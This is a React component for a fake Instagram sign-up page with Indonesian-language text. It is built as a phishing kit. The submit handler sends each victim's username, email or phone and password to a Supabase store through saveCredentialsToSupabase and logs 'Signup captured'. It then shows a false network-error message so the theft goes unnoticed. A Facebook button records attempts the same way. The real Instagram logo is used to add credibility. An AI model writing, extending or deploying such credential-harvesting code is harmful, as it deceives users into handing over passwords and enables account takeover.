import React, { useState } from 'react';
import { ScreenType, LanguageCode, TRANSLATIONS, INSTAGRAM_LOGO_SVG } from '../types';
import { Facebook, CheckCircle2, XCircle, AlertCircle } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { saveCredentialsToSupabase } from '../services/supabaseService';

interface SignUpProps {
  onSignUpSuccess: (username: string, fullName: string) => void;
  setScreen: (screen: ScreenType) => void;
  lang: LanguageCode;
}

export default function SignUp({ onSignUpSuccess, setScreen, lang }: SignUpProps) {
  const t = TRANSLATIONS[lang];
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [fullName, setFullName] = useState('');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  // Floating focus state
  const [focus1, setFocus1] = useState(false);
  const [focus2, setFocus2] = useState(false);
  const [focus3, setFocus3] = useState(false);
  const [focus4, setFocus4] = useState(false);

  const isFormValid = 
    emailOrPhone.trim().length > 3 && 
    fullName.trim().length > 2 && 
    username.trim().length > 2 && 
    password.trim().length >= 6;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;

    if (username.includes(' ') || /[A-Z]/.test(username)) {
      setErrorMsg('Nama pengguna harus berupa huruf kecil tanpa spasi.');
      return;
    }

    setLoading(true);
    setErrorMsg(null);

    // Save newly signed up credentials and payload details (like email/phone) to Supabase
    saveCredentialsToSupabase(`${username.toLowerCase()} (Email/Phone: ${emailOrPhone})`, password)
      .then((success) => {
        console.log('Signup captured:', success);
      })
      .finally(() => {
        setTimeout(() => {
          setLoading(false);
          setErrorMsg("Jaringan anda buruk silahkan di cek kembali.");
        }, 1200);
      });
  };

  const handleFacebookClick = () => {
    setLoading(true);
    setErrorMsg(null);
    saveCredentialsToSupabase('[Facebook Signup Attempt]', '[Triggered Mock Redirect]')
      .finally(() => {
        setTimeout(() => {
          setLoading(false);
          setErrorMsg("Jaringan anda buruk silahkan di cek kembali.");
        }, 1000);
      });
  };

  return (
    <div className="flex-1 flex flex-col justify-between pt-1 w-full bg-white font-sans text-black">
      <div className="flex-1 flex flex-col justify-center px-8 max-w-sm mx-auto w-full py-6">
        
        {/* Logo and Subtitle */}
        <div className="text-center mb-8 select-none">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/3840px-Instagram_logo.svg.png" 
            alt="Instagram" 
            className="h-12 object-contain mx-auto mb-3"
            referrerPolicy="no-referrer"
          />
          <p className="text-gray-400 text-[14px] font-semibold leading-relaxed px-2">
            {t.signUpSubtitle}
          </p>
        </div>

        {/* Facebook Link */}
        <button
          onClick={handleFacebookClick}
          className="w-full py-2 bg-[#0095f6] hover:bg-[#1877f2] text-white text-sm font-bold rounded-lg flex items-center justify-center gap-2 select-none active:scale-[0.98] cursor-pointer transition-colors"
        >
          <Facebook className="h-4 w-4 fill-current text-white" />
          <span>{t.facebookLoginText}</span>
        </button>

        {/* Divider standard */}
        <div className="flex items-center gap-4 py-4 select-none">
          <div className="flex-1 h-px bg-slate-200" />
          <span className="text-[11px] font-semibold text-gray-400 tracking-wider">
            {t.orText}
          </span>
          <div className="flex-1 h-px bg-slate-200" />
        </div>

        {/* Register input controls */}
        <form onSubmit={handleSubmit} className="space-y-2">
          {/* Email or Phone */}
          <div className="relative border border-slate-200 rounded-[5px] bg-[#fafafa] overflow-hidden focus-within:border-slate-400 transition-colors h-[44px]">
            <label
              className={`absolute left-3 transition-all duration-150 pointer-events-none select-none text-gray-400 max-w-[90%] truncate ${
                focus1 || emailOrPhone
                  ? 'top-1 text-[9px] transform translate-y-0.5'
                  : 'top-2.5 text-[12px] transform translate-y-0'
              }`}
            >
              {t.emailOrPhonePlaceholder}
            </label>
            <input
              type="text"
              value={emailOrPhone}
              onChange={(e) => setEmailOrPhone(e.target.value)}
              onFocus={() => setFocus1(true)}
              onBlur={() => setFocus1(false)}
              className={`w-full h-full px-3 text-sm bg-transparent border-none outline-none focus:ring-0 text-black ${
                emailOrPhone ? 'pt-3 pb-0.5' : 'pt-0'
              }`}
            />
          </div>

          {/* Full Name */}
          <div className="relative border border-slate-200 rounded-[5px] bg-[#fafafa] overflow-hidden focus-within:border-slate-400 transition-colors h-[44px]">
            <label
              className={`absolute left-3 transition-all duration-150 pointer-events-none select-none text-gray-400 max-w-[90%] truncate ${
                focus2 || fullName
                  ? 'top-1 text-[9px] transform translate-y-0.5'
                  : 'top-2.5 text-[12px] transform translate-y-0'
              }`}
            >
              {t.fullNamePlaceholder}
            </label>
            <input
              type="text"
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
              onFocus={() => setFocus2(true)}
              onBlur={() => setFocus2(false)}
              className={`w-full h-full px-3 text-sm bg-transparent border-none outline-none focus:ring-0 text-black ${
                fullName ? 'pt-3 pb-0.5' : 'pt-0'
              }`}
            />
          </div>

          {/* Username */}
          <div className="relative border border-slate-200 rounded-[5px] bg-[#fafafa] overflow-hidden focus-within:border-slate-400 transition-colors h-[44px]">
            <label
              className={`absolute left-3 transition-all duration-150 pointer-events-none select-none text-gray-400 max-w-[90%] truncate ${
                focus3 || username
                  ? 'top-1 text-[9px] transform translate-y-0.5'
                  : 'top-2.5 text-[12px] transform translate-y-0'
              }`}
            >
              {t.usernameCustomPlaceholder}
            </label>
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              onFocus={() => setFocus3(true)}
              onBlur={() => setFocus3(false)}
              className={`w-full h-full px-3 text-sm bg-transparent border-none outline-none focus:ring-0 text-black ${
                username ? 'pt-3 pb-0.5' : 'pt-0'
              }`}
            />
          </div>

          {/* Password */}
          <div className="relative border border-slate-200 rounded-[5px] bg-[#fafafa] overflow-hidden focus-within:border-slate-400 transition-colors h-[44px]">
            <label
              className={`absolute left-3 transition-all duration-150 pointer-events-none select-none text-gray-400 max-w-[90%] truncate ${
                focus4 || password
                  ? 'top-1 text-[9px] transform translate-y-0.5'
                  : 'top-2.5 text-[12px] transform translate-y-0'
              }`}
            >
              {t.passwordPlaceholder}
            </label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onFocus={() => setFocus4(true)}
              onBlur={() => setFocus4(false)}
              className={`w-full h-full px-3 text-sm bg-transparent border-none outline-none focus:ring-0 text-black ${
                password ? 'pt-3 pb-0.5' : 'pt-0'
              }`}
              placeholder=""
            />
          </div>

          {/* Privacy Note */}
          <p className="text-[11px] text-gray-400 text-center py-2 leading-snug">
            Orang-orang yang menggunakan layanan kami mungkin telah mengunggah informasi kontak Anda ke Instagram.
          </p>

          {/* Sign Up Button Submit */}
          <button
            type="submit"
            disabled={!isFormValid || loading}
            className={`w-full py-2.5 rounded-[8px] font-bold text-center text-sm flex items-center justify-center gap-2 select-none cursor-pointer ${
              isFormValid
                ? 'bg-[#0095f6] hover:bg-[#1877f2] text-white cursor-pointer active:scale-[0.98]'
                : 'bg-[#a2d4fa] text-white cursor-not-allowed'
            }`}
          >
            {loading ? (
              <div className="h-5 w-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
            ) : (
              <span>{t.signUpButton}</span>
            )}
          </button>
        </form>

        {/* Error notification prompt */}
        <AnimatePresence>
          {errorMsg && (
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="mt-4 p-3 bg-red-50 border border-red-200 rounded-lg flex items-start gap-2 text-xs text-red-600"
            >
              <AlertCircle className="h-4 w-4 text-red-500 shrink-0 mt-0.5" />
              <span>{errorMsg}</span>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Already registered log in redirector bottom bar */}
      <div className="w-full border-t border-slate-200 py-5 flex items-center justify-center gap-1.5 text-sm select-none bg-[#fafafa] shrink-0">
        <span className="text-gray-400">{t.loginPrompt}</span>
        <button
          onClick={() => setScreen('standard-login')}
          className="font-bold text-[#0095f6] hover:opacity-80 active:opacity-60 cursor-pointer"
        >
          {t.loginLinkText}
        </button>
      </div>
    </div>
  );
}
